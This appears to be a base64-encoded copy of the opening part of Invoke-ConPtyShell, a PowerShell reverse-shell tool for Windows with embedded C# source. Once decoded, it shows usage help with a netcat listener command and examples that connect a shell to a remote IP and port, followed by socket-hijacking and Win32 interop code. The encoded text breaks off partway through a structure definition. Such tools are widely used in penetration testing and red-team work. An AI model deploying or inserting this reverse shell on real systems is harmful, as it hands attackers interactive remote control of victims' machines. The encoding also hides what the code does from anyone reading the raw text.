ZnVuY3Rpb24gSW52b2tlLUNvblB0eVNoZWxsCnsgICAKICAgIDwjCiAgICAgICAgLlNZTk9QU0lTCiAgICAgICAgICAgIENvblB0eVNoZWxsIC0gRnVsbHkgSW50ZXJhY3RpdmUgUmV2ZXJzZSBTaGVsbCBmb3IgV2luZG93cyAKICAgICAgICAgICAgQXV0aG9yOiBzcGxpbnRlcl9jb2RlCiAgICAgICAgICAgIExpY2Vuc2U6IE1JVAogICAgICAgICAgICBTb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRvbmlvQ29jby9Db25QdHlTaGVsbAogICAgICAgIAogICAgICAgIC5ERVNDUklQVElPTgogICAgICAgICAgICBDb25QdHlTaGVsbCAtIEZ1bGx5IGludGVyYWN0aXZlIHJldmVyc2Ugc2hlbGwgZm9yIFdpbmRvd3MKICAgICAgICAgICAgCiAgICAgICAgICAgIFByb3Blcmx5IHNldCB0aGUgcm93cyBhbmQgY29scyB2YWx1ZXMuIFlvdSBjYW4gcmV0cmlldmUgaXQgZnJvbQogICAgICAgICAgICB5b3VyIHRlcm1pbmFsIHdpdGggdGhlIGNvbW1hbmQgInN0dHkgc2l6ZSIuCiAgICAgICAgICAgIAogICAgICAgICAgICBZb3UgY2FuIGF2b2lkIHRvIHNldCByb3dzIGFuZCBjb2xzIHZhbHVlcyBpZiB5b3UgcnVuIHlvdXIgbGlzdGVuZXIKICAgICAgICAgICAgd2l0aCB0aGUgZm9sbG93aW5nIGNvbW1hbmQ6CiAgICAgICAgICAgICAgICBzdHR5IHJhdyAtZWNobzsgKHN0dHkgc2l6ZTsgY2F0KSB8IG5jIC1sdm5wIDMwMDEKICAgICAgICAgICAKICAgICAgICAgICAgSWYgeW91IHdhbnQgdG8gY2hhbmdlIHRoZSBjb25zb2xlIHNpemUgZGlyZWN0bHkgZnJvbSBwb3dlcnNoZWxsCiAgICAgICAgICAgIHlvdSBjYW4gcGFzdGUgdGhlIGZvbGxvd2luZyBjb21tYW5kczoKICAgICAgICAgICAgICAgICR3aWR0aD04MAogICAgICAgICAgICAgICAgJGhlaWdodD0yNAogICAgICAgICAgICAgICAgJEhvc3QuVUkuUmF3VUkuQnVmZmVyU2l6ZSA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZSAoJHdpZHRoLCAkaGVpZ2h0KQogICAgICAgICAgICAgICAgJEhvc3QuVUkuUmF3VUkuV2luZG93U2l6ZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplIC1Bcmd1bWVudExpc3QgKCR3aWR0aCwgJGhlaWdodCkKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgIC5QQVJBTUVURVIgUmVtb3RlSXAKICAgICAgICAgICAgVGhlIHJlbW90ZSBpcCB0byBjb25uZWN0CiAgICAgICAgLlBBUkFNRVRFUiBSZW1vdGVQb3J0CiAgICAgICAgICAgIFRoZSByZW1vdGUgcG9ydCB0byBjb25uZWN0CiAgICAgICAgLlBBUkFNRVRFUiBSb3dzCiAgICAgICAgICAgIFJvd3Mgc2l6ZSBmb3IgdGhlIGNvbnNvbGUKICAgICAgICAgICAgRGVmYXVsdDogIjI0IgogICAgICAgIC5QQVJBTUVURVIgQ29scwogICAgICAgICAgICBDb2xzIHNpemUgZm9yIHRoZSBjb25zb2xlCiAgICAgICAgICAgIERlZmF1bHQ6ICI4MCIKICAgICAgICAuUEFSQU1FVEVSIENvbW1hbmRMaW5lCiAgICAgICAgICAgIFRoZSBjb21tYW5kbGluZSBvZiB0aGUgcHJvY2VzcyB0aGF0IHlvdSBhcmUgZ29pbmcgdG8gaW50ZXJhY3QKICAgICAgICAgICAgRGVmYXVsdDogInBvd2Vyc2hlbGwuZXhlIgogICAgICAgICAgICAKICAgICAgICAuRVhBTVBMRSAgCiAgICAgICAgICAgIFBTPkludm9rZS1Db25QdHlTaGVsbCAxMC4wLjAuMiAzMDAxCiAgICAgICAgICAgIAogICAgICAgICAgICBEZXNjcmlwdGlvbgogICAgICAgICAgICAtLS0tLS0tLS0tLQogICAgICAgICAgICBTcGF3biBhIHJldmVyc2Ugc2hlbGwKCiAgICAgICAgLkVYQU1QTEUKICAgICAgICAgICAgUFM+SW52b2tlLUNvblB0eVNoZWxsIC1SZW1vdGVJcCAxMC4wLjAuMiAtUmVtb3RlUG9ydCAzMDAxIC1Sb3dzIDMwIC1Db2xzIDkwCiAgICAgICAgICAgIAogICAgICAgICAgICBEZXNjcmlwdGlvbgogICAgICAgICAgICAtLS0tLS0tLS0tLQogICAgICAgICAgICBTcGF3biBhIHJldmVyc2Ugc2hlbGwgd2l0aCBzcGVjaWZpYyByb3dzIGFuZCBjb2xzIHNpemUKICAgICAgICAgICAgCiAgICAgICAgIC5FWEFNUExFCiAgICAgICAgICAgIFBTPkludm9rZS1Db25QdHlTaGVsbCAtUmVtb3RlSXAgMTAuMC4wLjIgLVJlbW90ZVBvcnQgMzAwMSAtUm93cyAzMCAtQ29scyA5MCAtQ29tbWFuZExpbmUgY21kLmV4ZQogICAgICAgICAgICAKICAgICAgICAgICAgRGVzY3JpcHRpb24KICAgICAgICAgICAgLS0tLS0tLS0tLS0KICAgICAgICAgICAgU3Bhd24gYSByZXZlcnNlIHNoZWxsIChjbWQuZXhlKSB3aXRoIHNwZWNpZmljIHJvd3MgYW5kIGNvbHMgc2l6ZQogICAgICAgICAgICAKICAgICAgICAuRVhBTVBMRQogICAgICAgICAgICBQUz5JbnZva2UtQ29uUHR5U2hlbGwgLVVwZ3JhZGUgLVJvd3MgMzAgLUNvbHMgOTAKICAgICAgICAgICAgCiAgICAgICAgICAgIERlc2NyaXB0aW9uCiAgICAgICAgICAgIC0tLS0tLS0tLS0tCiAgICAgICAgICAgIFVwZ3JhZGUgeW91ciBjdXJyZW50IHNoZWxsIHdpdGggc3BlY2lmaWMgcm93cyBhbmQgY29scyBzaXplCiAgICAgICAgICAgIAogICAgIz4KICAgIFBhcmFtCiAgICAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDApXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJlbW90ZUlwLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVQb3J0LAoKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUm93cyA9ICIyNCIsCgogICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb2xzID0gIjgwIiwKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbW1hbmRMaW5lID0gInBvd2Vyc2hlbGwuZXhlIiwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXBncmFkZQogICAgKQogICAgCiAgICBpZiggJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdVcGdyYWRlJykgKSB7CiAgICAgICAgJFJlbW90ZUlwID0gInVwZ3JhZGUiCiAgICAgICAgJFJlbW90ZVBvcnQgPSAic2hlbGwiCiAgICB9CiAgICBlbHNlewogIAogICAgICAgIGlmKC1Ob3QoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdSZW1vdGVJcCcpKSkgewogICAgICAgICAgICB0aHJvdyAiUmVtb3RlSXAgbWlzc2luZyBwYXJhbWV0ZXIiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmKC1Ob3QoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdSZW1vdGVQb3J0JykpKSB7CiAgICAgICAgICAgIHRocm93ICJSZW1vdGVQb3J0IG1pc3NpbmcgcGFyYW1ldGVyIgogICAgICAgIH0KICAgIH0KICAgICRwYXJhbWV0ZXJzQ29uUHR5U2hlbGwgPSBAKCRSZW1vdGVJcCwgJFJlbW90ZVBvcnQsICRSb3dzLCAkQ29scywgJENvbW1hbmRMaW5lKQogICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRTb3VyY2UgLUxhbmd1YWdlIENTaGFycDsKICAgICRvdXRwdXQgPSBbQ29uUHR5U2hlbGxNYWluQ2xhc3NdOjpDb25QdHlTaGVsbE1haW4oJHBhcmFtZXRlcnNDb25QdHlTaGVsbCkKICAgIFdyaXRlLU91dHB1dCAkb3V0cHV0Cn0KCiRTb3VyY2UgPSBAIgoKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uTmV0LlNvY2tldHM7CnVzaW5nIFN5c3RlbS5OZXQuTmV0d29ya0luZm9ybWF0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7CgpwdWJsaWMgY2xhc3MgQ29uUHR5U2hlbGxFeGNlcHRpb24gOiBFeGNlcHRpb24KewogICAgcHJpdmF0ZSBjb25zdCBzdHJpbmcgZXJyb3Jfc3RyaW5nID0gIlstXSBDb25QdHlTaGVsbEV4Y2VwdGlvbjogIjsKCiAgICBwdWJsaWMgQ29uUHR5U2hlbGxFeGNlcHRpb24oKSB7IH0KCiAgICBwdWJsaWMgQ29uUHR5U2hlbGxFeGNlcHRpb24oc3RyaW5nIG1lc3NhZ2UpIDogYmFzZShlcnJvcl9zdHJpbmcgKyBtZXNzYWdlKSB7IH0KfQoKcHVibGljIGNsYXNzIERlYWRsb2NrQ2hlY2tIZWxwZXIKewoKICAgIHByaXZhdGUgYm9vbCBkZWFkbG9ja0RldGVjdGVkOwogICAgcHJpdmF0ZSBJbnRQdHIgdGFyZ2V0SGFuZGxlOwoKICAgIHByaXZhdGUgZGVsZWdhdGUgdWludCBMUFRIUkVBRF9TVEFSVF9ST1VUSU5FKHVpbnQgbHBQYXJhbSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CgogICAgW0RsbEltcG9ydCgiS2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZCh1aW50IGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgTFBUSFJFQURfU1RBUlRfUk9VVElORSBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgb3V0IHVpbnQgbHBUaHJlYWRJZCk7CgogICAgcHJpdmF0ZSB1aW50IFRocmVhZENoZWNrRGVhZGxvY2sodWludCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgSW50UHRyIG9ialB0ciA9IEludFB0ci5aZXJvOwogICAgICAgIG9ialB0ciA9IFNvY2tldEhpamFja2luZy5OdFF1ZXJ5T2JqZWN0RHluYW1pYyh0aGlzLnRhcmdldEhhbmRsZSwgU29ja2V0SGlqYWNraW5nLk9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUy5PYmplY3ROYW1lSW5mb3JtYXRpb24sIDApOwogICAgICAgIHRoaXMuZGVhZGxvY2tEZXRlY3RlZCA9IGZhbHNlOwogICAgICAgIGlmIChvYmpQdHIgIT0gSW50UHRyLlplcm8pIE1hcnNoYWwuRnJlZUhHbG9iYWwob2JqUHRyKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBwdWJsaWMgYm9vbCBDaGVja0RlYWRsb2NrRGV0ZWN0ZWQoSW50UHRyIHRIYW5kbGUpCiAgICB7CiAgICAgICAgdGhpcy5kZWFkbG9ja0RldGVjdGVkID0gdHJ1ZTsKICAgICAgICB0aGlzLnRhcmdldEhhbmRsZSA9IHRIYW5kbGU7CiAgICAgICAgTFBUSFJFQURfU1RBUlRfUk9VVElORSBkZWxlZ2F0ZVRocmVhZENoZWNrRGVhZGxvY2sgPSBuZXcgTFBUSFJFQURfU1RBUlRfUk9VVElORSh0aGlzLlRocmVhZENoZWNrRGVhZGxvY2spOwogICAgICAgIEludFB0ciBoVGhyZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgdWludCB0aHJlYWRJZCA9IDA7CiAgICAgICAgLy93ZSBuZWVkIG5hdGl2ZSB0aHJlYWRzLCBDIyB0aHJlYWRzIGhhbmcgYW5kIGdvIGluIGxvY2suIFdlIG5lZWQgdG8gYXZvaWRzIGhhbmdzIG9uIG5hbWVkIHBpcGUgc28uLi4gTm8gaGFuZ3Mgbm8gZGVhZGxvY2tzLi4uIG5vIHBhaW4gbm8gZ2FpbnMuLi4KICAgICAgICBoVGhyZWFkID0gQ3JlYXRlVGhyZWFkKDAsIDAsIGRlbGVnYXRlVGhyZWFkQ2hlY2tEZWFkbG9jaywgSW50UHRyLlplcm8sIDAsIG91dCB0aHJlYWRJZCk7CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAxNTAwKTsKICAgICAgICAvL3dlIGRvIG5vdCBraWxsIHRoZSAicGVuZGluZyIgdGhyZWFkcyBoZXJlIHdpdGggVGVybWluYXRlVGhyZWFkKCkgYmVjYXVzZSBpdCB3aWxsIGNyYXNoIHRoZSB3aG9sZSBwcm9jZXNzIGlmIHdlIGRvIGl0IG9uIGxvY2tlZCB0aHJlYWRzLgogICAgICAgIC8vanVzdCBzb21lIHdhc3RlIG9mIHRocmVhZHMgOigKICAgICAgICBDbG9zZUhhbmRsZShoVGhyZWFkKTsKICAgICAgICByZXR1cm4gdGhpcy5kZWFkbG9ja0RldGVjdGVkOwogICAgfQp9CgpwdWJsaWMgc3RhdGljIGNsYXNzIFNvY2tldEhpamFja2luZwp7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX1NVQ0NFU1MgPSAweDAwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX0lORk9MRU5HVEhNSVNNQVRDSCA9IDB4YzAwMDAwMDQ7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgTlRTVEFUVVNfQlVGRkVST1ZFUkZMT1cgPSAweDgwMDAwMDA1OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX0JVRkZFUlRPT1NNQUxMID0gMHhjMDAwMDAyMzsKICAgIHByaXZhdGUgY29uc3QgaW50IE5UU1RBVFVTX1BFTkRJTkcgPSAweDAwMDAwMTAzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgV1NBX0ZMQUdfT1ZFUkxBUFBFRCA9IDB4MTsKICAgIHByaXZhdGUgY29uc3QgaW50IERVUExJQ0FURV9TQU1FX0FDQ0VTUyA9IDB4MjsKICAgIHByaXZhdGUgY29uc3QgaW50IFN5c3RlbUhhbmRsZUluZm9ybWF0aW9uID0gMTY7CiAgICBwcml2YXRlIGNvbnN0IGludCBQUk9DRVNTX0RVUF9IQU5ETEUgPSAweDAwNDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTSU9fVENQX0lORk8gPSB1bmNoZWNrZWQoKGludCkweEQ4MDAwMDI3KTsKICAgIHByaXZhdGUgY29uc3QgaW50IFNHX1VOQ09OU1RSQUlORURfR1JPVVAgPSAweDE7CiAgICBwcml2YXRlIGNvbnN0IGludCBTR19DT05TVFJBSU5FRF9HUk9VUCA9IDB4MjsKICAgIHByaXZhdGUgY29uc3QgdWludCBJT0NUTF9BRkRfR0VUX0NPTlRFWFQgPSAweDEyMDQzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgRVZFTlRfQUxMX0FDQ0VTUyA9IDB4MWYwMDAzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU3luY2hyb25pemF0aW9uRXZlbnQgPSAxOwogICAgcHJpdmF0ZSBjb25zdCBVSW50MzIgSU5GSU5JVEUgPSAweEZGRkZGRkZGOwoKCiAgICBwcml2YXRlIGVudW0gU09DS0VUX1NUQVRFIDogdWludAogICAgewogICAgICAgIFNvY2tldE9wZW4gPSAwLAogICAgICAgIFNvY2tldEJvdW5kID0gMSwKICAgICAgICBTb2NrZXRCb3VuZFVkcCA9IDIsCiAgICAgICAgU29ja2V0Q29ubmVjdGVkID0gMywKICAgICAgICBTb2NrZXRDbG9zZWQgPSAzCiAgICB9CgogICAgcHJpdmF0ZSBlbnVtIEFGRF9HUk9VUF9UWVBFIDogdWludAogICAgewogICAgICAgIEdyb3VwVHlwZU5laXRoZXIgPSAwLAogICAgICAgIEdyb3VwVHlwZUNvbnN0cmFpbmVkID0gU0dfQ09OU1RSQUlORURfR1JPVVAsCiAgICAgICAgR3JvdXBUeXBlVW5jb25zdHJhaW5lZCA9IFNHX1VOQ09OU1RSQUlORURfR1JPVVAKICAgIH0KCiAgICBwdWJsaWMgZW51bSBPQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MgOiBpbnQKICAgIHsKICAgICAgICBPYmplY3RCYXNpY0luZm9ybWF0aW9uID0gMCwKICAgICAgICBPYmplY3ROYW1lSW5mb3JtYXRpb24gPSAxLAogICAgICAgIE9iamVjdFR5cGVJbmZvcm1hdGlvbiA9IDIsCiAgICAgICAgT2JqZWN0QWxsVHlwZXNJbmZvcm1hdGlvbiA9IDMsCiAgICAgICAgT2JqZWN0SGFuZGxlSW5mb3JtYXRpb24gPSA0CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTwogICAgewogICAgICAgIHB1YmxpYyB1c2hvcnQgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyB1c2hvcnQgQ3JlYXRvckJhY2tUcmFjZUluZGV4OwogICAgICAgIHB1YmxpYyBieXRlIE9iamVjdFR5cGVJbmRleDsKICAgICAgICBwdWJsaWMgYnl0ZSBIYW5kbGVBdHRyaWJ1dGVzOwogICAgICAgIHB1YmxpYyB1c2hvcnQgSGFuZGxlVmFsdWU7CiAgICAgICAgcHVibGljIEludFB0ciBPYmplY3Q7CiAgICAgICAgcHVibGljIEludFB0ciBHcmFudGVkQWNjZXNzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IEdFTkVSSUNfTUFQUElORwogICAgewogICAgICAgIHB1YmxpYyBpbnQgR2VuZXJpY1JlYWQ7CiAgICAgICAgcHVibGljIGludCBHZW5lcmljV3JpdGU7CiAgICAgICAgcHVibGljIGludCBHZW5lcmljRXhlY3V0ZTsKICAgICAgICBwdWJsaWMgaW50IEdlbmVyaWNBbGw7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyCiAgICB7CiAgICAgICAgcHVibGljIFVOSUNPREVfU1RSSU5HIFR5cGVOYW1lOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsTnVtYmVyT2ZPYmplY3RzOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsTnVtYmVyT2ZIYW5kbGVzOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgVG90YWxOb25QYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBUb3RhbE5hbWVQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgVG90YWxIYW5kbGVUYWJsZVVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IEhpZ2hXYXRlck51bWJlck9mT2JqZWN0czsvLyBQZWFrT2JqZWN0Q291bnQ7CiAgICAgICAgcHVibGljIHVpbnQgSGlnaFdhdGVyTnVtYmVyT2ZIYW5kbGVzOy8vIFBlYWtIYW5kbGVDb3VudDsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJQYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJOb25QYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJOYW1lUG9vbFVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IEhpZ2hXYXRlckhhbmRsZVRhYmxlVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgSW52YWxpZEF0dHJpYnV0ZXM7CiAgICAgICAgcHVibGljIEdFTkVSSUNfTUFQUElORyBHZW5lcmljTWFwcGluZzsKICAgICAgICBwdWJsaWMgdWludCBWYWxpZEFjY2Vzc01hc2s7CiAgICAgICAgcHVibGljIGJ5dGUgU2VjdXJpdHlSZXF1aXJlZDsvL2Jvb2wKICAgICAgICBwdWJsaWMgYnl0ZSBNYWludGFpbkhhbmRsZUNvdW50Oy8vYm9vbAogICAgICAgIHB1YmxpYyBieXRlIFR5cGVJbmRleDsKICAgICAgICBwdWJsaWMgYnl0ZSBSZXNlcnZlZEJ5dGU7CiAgICAgICAgcHVibGljIHVpbnQgUG9vbFR5cGU7CiAgICAgICAgcHVibGljIHVpbnQgRGVmYXVsdFBhZ2VkUG9vbENoYXJnZTsvLyBQYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBEZWZhdWx0Tm9uUGFnZWRQb29sQ2hhcmdlOy8vTm9uUGFnZWRQb29sVXNhZ2U7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IE9CSkVDVF9OQU1FX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIFVOSUNPREVfU1RSSU5HIE5hbWU7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgVU5JQ09ERV9TVFJJTkcKICAgIHsKICAgICAgICBwdWJsaWMgdXNob3J0IExlbmd0aDsKICAgICAgICBwdWJsaWMgdXNob3J0IE1heGltdW1MZW5ndGg7CiAgICAgICAgcHVibGljIEludFB0ciBCdWZmZXI7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBRGF0YQogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCB3VmVyc2lvbjsKICAgICAgICBwdWJsaWMgc2hvcnQgd0hpZ2hWZXJzaW9uOwogICAgICAgIHB1YmxpYyBzaG9ydCBpTWF4U29ja2V0czsKICAgICAgICBwdWJsaWMgc2hvcnQgaU1heFVkcERnOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBWZW5kb3JJbmZvOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDI1NyldCiAgICAgICAgcHVibGljIHN0cmluZyBzekRlc2NyaXB0aW9uOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDEyOSldCiAgICAgICAgcHVibGljIHN0cmluZyBzelN5c3RlbVN0YXR1czsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0cnVjdCBXU0FQUk9UT0NPTENIQUlOCiAgICB7CiAgICAgICAgcHVibGljIGludCBDaGFpbkxlbjsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNyldCiAgICAgICAgcHVibGljIHVpbnRbXSBDaGFpbkVudHJpZXM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBUFJPVE9DT0xfSU5GTwogICAgewogICAgICAgIHB1YmxpYyB1aW50IGR3U2VydmljZUZsYWdzMTsKICAgICAgICBwdWJsaWMgdWludCBkd1NlcnZpY2VGbGFnczI7CiAgICAgICAgcHVibGljIHVpbnQgZHdTZXJ2aWNlRmxhZ3MzOwogICAgICAgIHB1YmxpYyB1aW50IGR3U2VydmljZUZsYWdzNDsKICAgICAgICBwdWJsaWMgdWludCBkd1Byb3ZpZGVyRmxhZ3M7CiAgICAgICAgcHVibGljIEd1aWQgUHJvdmlkZXJJZDsKICAgICAgICBwdWJsaWMgdWludCBkd0NhdGFsb2dFbnRyeUlkOwogICAgICAgIHB1YmxpYyBXU0FQUk9UT0NPTENIQUlOIFByb3RvY29sQ2hhaW47CiAgICAgICAgcHVibGljIGludCBpVmVyc2lvbjsKICAgICAgICBwdWJsaWMgaW50IGlBZGRyZXNzRmFtaWx5OwogICAgICAgIHB1YmxpYyBpbnQgaU1heFNvY2tBZGRyOwogICAgICAgIHB1YmxpYyBpbnQgaU1pblNvY2tBZGRyOwogICAgICAgIHB1YmxpYyBpbnQgaVNvY2tldFR5cGU7CiAgICAgICAgcHVibGljIGludCBpUHJvdG9jb2w7CiAgICAgICAgcHVibGljIGludCBpUHJvdG9jb2xNYXhPZmZzZXQ7CiAgICAgICAgcHVibGljIGludCBpTmV0d29ya0J5dGVPcmRlcjsKICAgICAgICBwdWJsaWMgaW50IGlTZWN1cml0eVNjaGVtZTsKICAgICAgICBwdWJsaWMgdWludCBkd01lc3NhZ2VTaXplOwogICAgICAgIHB1YmxpYyB1aW50IGR3UHJvdmlkZXJSZXNlcnZlZDsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxUU3RyLCBTaXplQ29uc3QgPSAyNTYpXQogICAgICAgIHB1YmxpYyBzdHJpbmcgc3pQcm90b2NvbDsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLQUREUl9JTgogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fZmFtaWx5OwogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fcG9ydDsKICAgICAgICBwdWJsaWMgdWludCBzaW5fYWRkcjsKICAgICAgICBwdWJsaWMgbG9uZyBzaW5femVybzsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBUQ1BfSU5GT192MAogICAgewogICAgICAgIHB1YmxpYyBUY3BTdGF0ZSBTdGF0ZTsKICAgICAgICBwdWJsaWMgVUludDMyIE1zczsKICAgICAgICBwdWJsaWMgVUludDY0IENvbm5lY3Rpb25UaW1lTXM7CiAgICAgICAgcHVibGljIGJ5dGUgVGltZXN0YW1wc0VuYWJsZWQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSdHRVczsKICAgICAgICBwdWJsaWMgVUludDMyIE1pblJ0dFVzOwogICAgICAgIHB1YmxpYyBVSW50MzIgQnl0ZXNJbkZsaWdodDsKICAgICAgICBwdWJsaWMgVUludDMyIEN3bmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBTbmRXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSY3ZXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSY3ZCdWY7CiAgICAgICAgcHVibGljIFVJbnQ2NCBCeXRlc091dDsKICAgICAgICBwdWJsaWMgVUludDY0IEJ5dGVzSW47CiAgICAgICAgcHVibGljIFVJbnQzMiBCeXRlc1Jlb3JkZXJlZDsKICAgICAgICBwdWJsaWMgVUludDMyIEJ5dGVzUmV0cmFuczsKICAgICAgICBwdWJsaWMgVUludDMyIEZhc3RSZXRyYW5zOwogICAgICAgIHB1YmxpYyBVSW50MzIgRHVwQWNrc0luOwogICAgICAgIHB1YmxpYyBVSW50MzIgVGltZW91dEVwaXNvZGVzOwogICAgICAgIHB1YmxpYyBieXRlIFN5blJldHJhbnM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgbGluZ2VyCiAgICB7CiAgICAgICAgcHVibGljIFVJbnQxNiBsX29ub2ZmOwogICAgICAgIHB1YmxpYyBVSW50MTYgbF9